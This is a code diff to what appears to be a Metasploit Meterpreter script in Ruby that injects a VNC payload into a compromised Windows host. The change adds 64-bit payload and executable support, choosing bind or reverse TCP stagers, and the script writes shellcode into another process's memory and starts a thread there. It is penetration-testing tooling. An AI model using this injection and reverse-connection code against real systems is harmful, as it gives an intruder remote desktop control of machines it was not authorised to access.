@@ -90,26 +90,26 @@ def unsupported
 end
 unsupported if client.platform != 'windows'
 
+is_x64 = client.arch == 'x64'
+
 #
 # Create the raw payload
 #
 if (tunnel)
   print_status("Creating a VNC bind tcp stager: RHOST=#{lhost} LPORT=#{rport}")
-  payload = "windows/vncinject/bind_tcp"
-
-  pay = client.framework.payloads.create(payload)
-  pay.datastore['RHOST'] = lhost
-  pay.datastore['LPORT'] = rport
-  pay.datastore['VNCPORT'] = vport
+  payload = is_x64 ? "windows/x64/vncinject/bind_tcp" : "windows/vncinject/bind_tcp"
 else
   print_status("Creating a VNC reverse tcp stager: LHOST=#{rhost} LPORT=#{rport}")
-  payload = "windows/vncinject/reverse_tcp"
-
-  pay = client.framework.payloads.create(payload)
-  pay.datastore['LHOST'] = rhost
-  pay.datastore['LPORT'] = rport
-  pay.datastore['VNCPORT'] = vport
+  payload = is_x64 ? "windows/x64/vncinject/reverse_tcp" : "windows/vncinject/reverse_tcp"
 end
+
+pay = client.framework.payloads.create(payload)
+
+raise "Failed to create payload: #{payload}" unless pay
+
+tunnel ? pay.datastore['RHOST'] = lhost : pay.datastore['LHOST'] = rhost
+pay.datastore['LPORT'] = rport
+pay.datastore['VNCPORT'] = vport
 
 if (not courtesy)
   pay.datastore['DisableCourtesyShell'] = true
@@ -153,7 +153,7 @@ if (inject)
   host_process.memory.write(mem, raw)
   host_process.thread.create(mem, 0)
 else
-  exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
+  exe = is_x64 ? ::Msf::Util::EXE.to_win64pe(client.framework, raw) : ::Msf::Util::EXE.to_win32pe(client.framework, raw)
   print_status("VNC stager executable #{exe.length} bytes long")
 
   #
